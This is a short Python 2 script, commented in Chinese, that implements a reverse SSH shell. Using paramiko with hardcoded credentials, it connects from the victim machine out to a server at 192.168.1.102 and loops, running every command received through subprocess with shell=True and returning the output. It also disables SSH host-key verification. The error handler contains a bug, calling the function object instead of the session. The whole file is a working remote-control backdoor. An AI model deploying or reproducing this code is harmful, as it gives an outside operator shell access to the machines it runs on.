# coding=utf-8
"""
因为Windows 95%不会安装SSH服务端
因此反向将命令从SSH服务端发送到SSH客户端
前置依赖:sudo pip install paramiko
"""
import subprocess

import paramiko


def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    # 可以通过使用密钥认证的方式来做,但是为了方便直接上密码
    # client.load_host_keys('/home/hope6537/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        # 读取头信息
        print(ssh_session.recv(1024))
        while True:
            # 通过SSH服务器获取命令
            command = ssh_session.recv(1024)
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception, e:
                ssh_command.send(str(e))
        client.close()
    return


ssh_command('192.168.1.102', 22, 'hope', 'customPassword', '连接成功')
